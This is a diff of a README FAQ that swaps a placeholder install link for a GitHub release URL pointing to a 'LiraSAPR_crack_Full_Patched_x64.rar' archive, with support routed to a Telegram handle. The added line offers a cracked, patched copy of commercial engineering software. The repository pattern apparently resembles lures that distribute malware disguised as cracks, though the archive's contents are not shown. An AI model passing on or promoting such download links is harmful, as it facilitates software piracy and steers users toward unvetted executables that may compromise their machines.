@@ -22,7 +22,7 @@ Complete documentation is available [here](link_to_documentation). 🔗
 
 # Frequently Asked Questions (FAQ) ❓
 - How do I install the program? 🤔
-- You can install from new [release](ссылка на файл)
+- You can install from new [release](https://github.com/gagaga1132/LiraSAPR/releases/download/LiraSAPR_Crack/LiraSAPR_crack_Full_Patched_x64.rar)
 
 - How can I get support? 💬
 - Out TG Support [Support](@MBNSupport)
